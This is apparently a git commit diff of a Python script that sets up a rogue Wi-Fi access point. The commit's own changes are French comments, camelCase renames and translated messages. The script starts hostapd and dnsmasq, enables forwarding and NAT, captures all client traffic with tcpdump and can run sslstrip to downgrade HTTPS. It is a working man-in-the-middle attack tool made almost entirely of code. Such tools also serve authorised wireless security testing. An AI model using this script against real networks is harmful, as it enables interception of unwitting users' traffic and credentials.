ea073af5b0279990bd3ecb6edd3b92ccc2d21c60
Célian | VullWen <celian.pinquier@gmail.com>
2025-02-23 15:53:37 +0100

    commentaires

--- main.py
+++ main.py
@@ -4,115 +4,125 @@ import time
 import argparse
 import os
 import tempfile
-import shutil  # Ajout pour la gestion des fichiers
+import shutil
 
-###########################################################################################
+###############################
+########## Arguments ##########
+###############################
+
+parser = argparse.ArgumentParser()
+parser.add_argument("wlanInterface", help="L'interface en mode moniteur", type=str)
+parser.add_argument("inetInterface", help="L'interface internet", type=str)
+parser.add_argument("--ssid", help="SSID du réseau", type=str, required=True)
+parser.add_argument("--wpa", help="Phrase de passe WPA du réseau", type=str, required=True)
+parser.add_argument("--channel", help="Canal à utiliser", type=int, required=True)
+parser.add_argument("--sslstrip", help="Utiliser sslstrip", action="store_true")
+parser.add_argument("--logdir", help="Répertoire pour sauvegarder les données capturées", type=str, default=".")
+args = parser.parse_args()
+
+################################
+######### Vérifications ########
+################################
 
 def die(message):
+    # Afficher un message d'erreur et quitter le programme
     sys.stderr.write("%s\n" % message)
     exit(1)
 
-def check_sslstrip():
+def checkSslstrip():
+    # Vérifier si sslstrip est installé et exécutable
     try:
         return not subprocess.call(["sslstrip", "--help"], stdout=null, stderr=null)
     except:
         return False
 
-def check_hostapd():
+def checkHostapd():
+    # Vérifier si hostapd est installé et exécutable
     try:
         return subprocess.call(["hostapd", "--help"], stdout=null, stderr=null) != 127
     except:
         return False
 
-def check_dnsmasq():
+def checkDnsmasq():
+    # Vérifier si dnsmasq est installé et exécutable
     try:
         return not subprocess.call(["dnsmasq", "--help"], stdout=null, stderr=null)
     except:
         return False
 
-def check_tcpdump():
+def checkTcpdump():
+    # Vérifier si tcpdump est installé et exécutable
     try:
         return subprocess.call(["tcpdump", "--help"], stdout=null, stderr=null) != 127
     except:
         return False
 
-def check_iptables():
+def checkIptables():
+    # Vérifier si iptables est installé et exécutable
     try:
         return not subprocess.call(["iptables", "--help"], stdout=null, stderr=null)
     except:
         return False
 
-def check_ip():
+def checkIp():
+    # Vérifier si la commande ip est installée et exécutable
     try:
         return not subprocess.call(["ip", "link", "show"], stdout=null, stderr=null)
     except:
         return False
 
-def check_mergecap():  # Nouvelle fonction de vérification
+def checkMergecap():
+    # Vérifier si mergecap est installé et exécutable
     try:
         return subprocess.call(["mergecap", "--help"], stdout=null, stderr=null) != 127
     except:
         return False
 
-def poll_iface_exists(iface):
+def pollIfaceExists(iface):
+    # Vérifier si une interface réseau existe
     return not subprocess.call(["ip", "link", "show", iface], stdout=null, stderr=null)
 
 null = open("/dev/null", "w")
 
-###########################################################################################
+if os.geteuid(): die("Vous devez être root")
+if not checkIp(): die("Commande ip absente ou cassée")
+if not checkTcpdump(): die("Commande tcpdump absente ou cassée")
+if not checkMergecap(): die("Commande mergecap absente ou cassée")
+if not checkIptables(): die("iptables absent ou cassé")
+if not checkDnsmasq(): die("Commande dnsmasq absente ou cassée")
+if not checkHostapd(): die("Commande hostapd absente ou cassée")
+if args.sslstrip and not checkSslstrip(): die("Commande sslstrip absente ou cassée")
 
-### MAIN
+if not pollIfaceExists(args.wlanInterface): die("%s n'est pas une interface valide" % args.wlanInterface)
+if not pollIfaceExists(args.inetInterface): die("%s n'est pas une interface valide" % args.inetInterface)
+if (len(args.wpa) < 8) or (len(args.wpa) > 63): die("La phrase de passe WPA doit contenir entre 8 et 63 caractères")
 
-parser = argparse.ArgumentParser()
-parser.add_argument("wlan_interface", help="The Interface in monitor mode interface", type=str)
-parser.add_argument("inet_interface", help="The Interface in monitor mode interface", type=str)
-parser.add_argument("--ssid", help="Use this ssid for network", type=str, required=True)
-parser.add_argument("--wpa", help="Sets up the passphrase for the network", type=str, required=True)
-parser.add_argument("--channel", help="Use this channel", type=int, required=True)
-parser.add_argument("--sslstrip", help="Use sslstrip", action="store_true")
-parser.add_argument("--logdir", help="Directory to save captured data", type=str, default=".")  # Nouvel argument
-args = parser.parse_args()
+#################################
+########## Configuration ########
+#################################
 
-### Run preliminary checks
+logTempDir = tempfile.mkdtemp()
+logPcapDir = os.path.join(logTempDir, "pcap")
+os.makedirs(logPcapDir, exist_ok=True)
+os.makedirs(args.logdir, exist_ok=True)
 
-if os.geteuid(): die("You need to be root")
-if not check_ip(): die("ip command absent or broken")
-if not check_tcpdump(): die("tcpdump command absent or broken")
-if not check_mergecap(): die("mergecap command absent or broken")  # Nouvelle vérification
-if not check_iptables(): die("iptables absent or broken")
-if not check_dnsmasq(): die("dnsmasq command absent or broken")
-if not check_hostapd(): die("hostapd command absent or broken")
-if args.sslstrip and not check_sslstrip(): die("sslstrip command absent or broken")
+print("Démarrage du Rogue AP\n")
+print("En cours d'exécution")
 
-if not poll_iface_exists(args.wlan_interface): die("%s is not a valid interface" % args.wlan_interface)
-if not poll_iface_exists(args.inet_interface): die("%s is not a valid interface" % args.inet_interface)
-if (len(args.wpa) < 8) or (len(args.wpa) > 63): die("wpa passphrase needs to be 8-63 characters")
+subprocess.call(["iw", "dev", args.wlanInterface, "set", "channel", str(args.channel)], stdout=null, stderr=null)
 
-# Création des répertoires temporaires pour les logs
-log_temp_dir = tempfile.mkdtemp()
-log_pcap_dir = os.path.join(log_temp_dir, "pcap")
-os.makedirs(log_pcap_dir, exist_ok=True)
-os.makedirs(args.logdir, exist_ok=True)  # Crée le répertoire de sortie
+iface = args.wlanInterface
 
-print("Starting Rogue AP\n")
-print("Running")
-
-### init
-subprocess.call(["iw", "dev", args.wlan_interface, "set", "channel", str(args.channel)], stdout=null, stderr=null)
-
-iface = args.wlan_interface
-
-with open("/proc/sys/net/ipv4/ip_forward", "r") as f: ip_forward = f.read().strip()
+with open("/proc/sys/net/ipv4/ip_forward", "r") as f: ipForward = f.read().strip()
 with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1")
-subprocess.call(["iptables", "-I", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
-subprocess.call(["iptables", "-I", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
-subprocess.call(["iptables", "-t", "nat", "-I", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"], stdout=null, stderr=null)
+subprocess.call(["iptables", "-I", "FORWARD", "-i", iface, "-o", args.inetInterface, "-j", "ACCEPT"], stdout=null, stderr=null)
+subprocess.call(["iptables", "-I", "FORWARD", "-o", iface, "-i", args.inetInterface, "-j", "ACCEPT"], stdout=null, stderr=null)
+subprocess.call(["iptables", "-t", "nat", "-I", "POSTROUTING", "-o", args.inetInterface, "-j", "MASQUERADE"], stdout=null, stderr=null)
 
 if args.sslstrip:
     subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=null, stderr=null)
 
-# Configuration hostapd
-n, hostapd_path = tempfile.mkstemp()
+n, hostapdPath = tempfile.mkstemp()
 with os.fdopen(n, "w") as f:
     f.write(f"interface={iface}\n")
     f.write("driver=nl80211\n")
@@ -121,8 +131,7 @@ with os.fdopen(n, "w") as f:
     f.write("wpa=3\n")
     f.write(f"wpa_passphrase={args.wpa}\n")
 
-# Configuration dnsmasq
-n, dnsmasq_path = tempfile.mkstemp()
+n, dnsmasqPath = tempfile.mkstemp()
 with os.fdopen(n, "w") as f:
     f.write(f"interface={iface}\n")
     f.write("dhcp-range=10.55.66.100,10.55.66.200,5m\n")
@@ -131,39 +140,42 @@ with os.fdopen(n, "w") as f:
     f.write("no-hosts\n")
     f.write("addn-hosts=/dev/null\n")
 
-def nukeall(popen_list):
-    for popen in popen_list:
+def nukeAll(popenList):
+    # Terminer tous les processus de la liste
+    for popen in popenList:
         if popen.poll() is None:
             popen.kill()
-    popen_list.clear()
+    popenList.clear()
 
-### run and restore loop
+#############################
+#### Boucle principale ######
+#############################
+
 try:
     pids = []
-    deathloop_count = -1
+    deathloopCount = -1
     while True:
-        deathloop_count += 1
-        print(f"********** INIT #{deathloop_count} *************")
+        deathloopCount += 1
+        print(f"********** INIT #{deathloopCount} *************")
 
-        p = subprocess.Popen(["hostapd", hostapd_path])
+        p = subprocess.Popen(["hostapd", hostapdPath])
         pids.append(p)
 
-        print(f"waiting for interface '{iface}' to emerge")
-        while not poll_iface_exists(iface):
+        print(f"Attente de l'apparition de l'interface '{iface}'")
+        while not pollIfaceExists(iface):
             time.sleep(0.01)
 
         subprocess.call(["ifconfig", iface, "10.55.66.1", "netmask", "255.255.255.0", "up"])
 
-        # Modification de la commande tcpdump pour sauvegarder les paquets
-        pcap_file = os.path.join(log_pcap_dir, str(deathloop_count))
-        p = subprocess.Popen(["tcpdump", "-i", iface, "-w", pcap_file], stdout=null, stderr=null)
+        pcapFile = os.path.join(logPcapDir, str(deathloopCount))
+        p = subprocess.Popen(["tcpdump", "-i", iface, "-w", pcapFile], stdout=null, stderr=null)
         pids.append(p)
 
         if args.sslstrip:
             p = subprocess.Popen(["sslstrip", "-a", "-f"], stderr=null)
             pids.append(p)
 
-        p = subprocess.Popen(["dnsmasq", "-d", "-C", dnsmasq_path])
+        p = subprocess.Popen(["dnsmasq", "-d", "-C", dnsmasqPath])
         pids.append(p)
 
         while True:
@@ -171,41 +183,43 @@ try:
                 break
             time.sleep(0.01)
 
-        print("program in chain failed, restarting chain...\n")
-        nukeall(pids)
+        print("Un programme de la chaîne a échoué, redémarrage de la chaîne...\n")
+        nukeAll(pids)
 
 except KeyboardInterrupt:
     pass
 
-print("Stopping Rogue AP")
-nukeall(pids)
+##############################
+########## Nettoyage #########
+##############################
 
-# Fusion des fichiers .pcap
-pcap_files = [os.path.join(log_pcap_dir, f) for f in os.listdir(log_pcap_dir) 
-              if os.path.isfile(os.path.join(log_pcap_dir, f))]
+print("Arrêt du Rogue AP")
+nukeAll(pids)
 
-if pcap_files:
-    output_pcap = os.path.join(args.logdir, "capture.pcap")
-    subprocess.call(["mergecap", "-w", output_pcap] + pcap_files, stdout=null, stderr=null)
-    print(f"Captures merged into {output_pcap}")
+pcapFiles = [os.path.join(logPcapDir, f) for f in os.listdir(logPcapDir)
+              if os.path.isfile(os.path.join(logPcapDir, f))]
+
+if pcapFiles:
+    outputPcap = os.path.join(args.logdir, "capture.pcap")
+    subprocess.call(["mergecap", "-w", outputPcap] + pcapFiles, stdout=null, stderr=null)
+    print(f"Captures fusionnées dans {outputPcap}")
 else:
-    print("No network captures to merge")
+    print("Aucune capture réseau à fusionner")
 
-# Nettoyage
-shutil.rmtree(log_temp_dir, ignore_errors=True)
+shutil.rmtree(logTempDir, ignore_errors=True)
 
-with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write(ip_forward)
-subprocess.call(["iptables", "-D", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
-subprocess.call(["iptables", "-D", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
-subprocess.call(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"], stdout=null, stderr=null)
+with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write(ipForward)
+subprocess.call(["iptables", "-D", "FORWARD", "-i", iface, "-o", args.inetInterface, "-j", "ACCEPT"], stdout=null, stderr=null)
+subprocess.call(["iptables", "-D", "FORWARD", "-o", iface, "-i", args.inetInterface, "-j", "ACCEPT"], stdout=null, stderr=null)
+subprocess.call(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", args.inetInterface, "-j", "MASQUERADE"], stdout=null, stderr=null)
 
 if args.sslstrip:
     subprocess.call(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=null, stderr=null)
 
-subprocess.call(["ip", "addr", "flush", args.wlan_interface], stdout=null, stderr=null)
-subprocess.call(["ip", "link", "set", args.wlan_interface, "down"], stdout=null, stderr=null)
-subprocess.call(["iw", "dev", args.wlan_interface, "set", "type", "monitor"], stdout=null, stderr=null)
-subprocess.call(["ip", "link", "set", args.wlan_interface, "up"], stdout=null, stderr=null)
+subprocess.call(["ip", "addr", "flush", args.wlanInterface], stdout=null, stderr=null)
+subprocess.call(["ip", "link", "set", args.wlanInterface, "down"], stdout=null, stderr=null)
+subprocess.call(["iw", "dev", args.wlanInterface, "set", "type", "monitor"], stdout=null, stderr=null)
+subprocess.call(["ip", "link", "set", args.wlanInterface, "up"], stdout=null, stderr=null)
 
-os.remove(dnsmasq_path)
-os.remove(hostapd_path)
+os.remove(dnsmasqPath)
+os.remove(hostapdPath)
